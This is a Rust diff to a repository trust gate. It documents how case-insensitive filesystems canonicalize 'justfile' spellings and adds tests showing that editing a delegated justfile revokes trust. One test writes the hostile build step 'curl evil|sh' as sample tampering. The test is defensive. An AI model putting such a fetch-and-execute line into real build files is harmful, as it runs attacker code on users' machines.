@@ -89,6 +89,35 @@
 //! attacker cannot hide a hostile delegated script behind their own
 //! `.gitignore` entry.
 //!
+//! # One real file, one folded entry (case-insensitive filesystems)
+//!
+//! [`IMPLICIT_DEFAULTS`] deliberately lists several spellings of the same
+//! conceptual file (`just` → `justfile`, `Justfile`, `.justfile`). On a
+//! **case-insensitive** filesystem — default APFS on macOS, NTFS on Windows —
+//! two of those spellings name the *same inode*, so both candidate paths
+//! "exist" and the naive worry is that one file gets folded twice, under two
+//! names: a double count, and a digest that silently depends on the host
+//! filesystem.
+//!
+//! That does not happen, and the reason is worth pinning here because it is
+//! not obvious. [`Path::canonicalize`] does more than resolve symlinks: on
+//! both macOS and Windows it returns the **real on-disk spelling** of every
+//! component, so `…/Justfile` and `…/justfile` canonicalize to one identical
+//! `PathBuf`. [`delegated_targets`] dedupes on that canonical path *and*
+//! derives the folded entry name from it, so the two spellings collapse to a
+//! single entry carrying the true on-disk case. Verified empirically against
+//! this repository's own `post_merge = "just install"` (one folded entry,
+//! named `justfile`, on a confirmed case-insensitive volume).
+//!
+//! The invariant this rests on — *dedupe key and folded name both come from
+//! `canonicalize`, never from the raw token* — is load-bearing and easy to
+//! break by accident. A future refactor that derived the entry name from the
+//! matched token, or that dedupe'd before canonicalizing, would reintroduce
+//! the double fold on macOS only, and would make grant and check diverge the
+//! moment one side normalized and the other did not. It is pinned by
+//! `implicit_default_folds_one_entry_per_real_file`, which asserts both the
+//! count and the spelling.
+//!
 //! # Scope boundary (honest limits)
 //!
 //! This is a *trust* gate, not a *sandbox*. It governs whether cosmon will run
@@ -917,6 +946,89 @@ mod tests {
             evaluate(repo.path(), store.path()),
             TrustStatus::Stale,
             "editing the implicit Makefile default must revoke trust"
+        );
+    }
+
+    /// Invariant guard (task-20260719-3cbb): one real file folds exactly once,
+    /// under its **on-disk spelling**, even though [`IMPLICIT_DEFAULTS`] lists
+    /// `justfile` *and* `Justfile` — two names for one inode on a
+    /// case-insensitive filesystem, where both candidate paths resolve.
+    ///
+    /// This holds because `canonicalize` returns the real on-disk case on
+    /// macOS/Windows, so the dedupe key and the folded name agree. Nothing in
+    /// the code says so out loud, which is exactly why it is pinned: a
+    /// refactor that named entries from the matched token, or dedupe'd before
+    /// canonicalizing, would double-fold on macOS only and split the grant and
+    /// check digests by platform.
+    ///
+    /// Green on either filesystem — on a case-sensitive one only `justfile`
+    /// resolves and the count is trivially one — but only *meaningful* on a
+    /// case-insensitive one, which the assertion message reports.
+    #[test]
+    fn implicit_default_folds_one_entry_per_real_file() {
+        let repo = tempfile::tempdir().unwrap();
+        let cosmon = repo.path().join(".cosmon");
+        std::fs::create_dir_all(cosmon.join("formulas")).unwrap();
+        let config = cosmon.join("config.toml");
+        std::fs::write(&config, "[gates]\nbuild_command = \"just\"\n").unwrap();
+        Command::new("git")
+            .arg("-C")
+            .arg(repo.path())
+            .args(["init", "-q", "-b", "main"])
+            .output()
+            .unwrap();
+        // Exactly ONE real file on disk, spelled lowercase.
+        std::fs::write(repo.path().join("justfile"), "build:\n\techo benign\n").unwrap();
+        git_commit_all(repo.path());
+
+        let case_insensitive = repo.path().join("Justfile").is_file();
+        let targets = delegated_targets(
+            repo.path(),
+            &[config],
+            "[gates]\nbuild_command = \"just\"\n",
+        );
+        assert_eq!(
+            targets.len(),
+            1,
+            "one real file must fold once (case-insensitive fs: {case_insensitive}), got {targets:?}"
+        );
+        assert_eq!(
+            targets[0].file_name().unwrap(),
+            "justfile",
+            "the folded entry must carry the on-disk spelling, not the token's"
+        );
+    }
+
+    /// The case canonicalization above must not weaken the gate: editing the
+    /// implicit `justfile` default still revokes trust.
+    #[test]
+    fn implicit_justfile_default_goes_stale() {
+        let repo = tempfile::tempdir().unwrap();
+        let store = tempfile::tempdir().unwrap();
+        let cosmon = repo.path().join(".cosmon");
+        std::fs::create_dir_all(cosmon.join("formulas")).unwrap();
+        std::fs::write(
+            cosmon.join("config.toml"),
+            "[gates]\nbuild_command = \"just\"\n",
+        )
+        .unwrap();
+        Command::new("git")
+            .arg("-C")
+            .arg(repo.path())
+            .args(["init", "-q", "-b", "main"])
+            .output()
+            .unwrap();
+        std::fs::write(repo.path().join("justfile"), "build:\n\techo benign\n").unwrap();
+        git_commit_all(repo.path());
+
+        grant(repo.path(), store.path()).unwrap();
+        assert_eq!(evaluate(repo.path(), store.path()), TrustStatus::Trusted);
+
+        std::fs::write(repo.path().join("justfile"), "build:\n\tcurl evil|sh\n").unwrap();
+        assert_eq!(
+            evaluate(repo.path(), store.path()),
+            TrustStatus::Stale,
+            "editing the implicit justfile default must revoke trust"
         );
     }
 
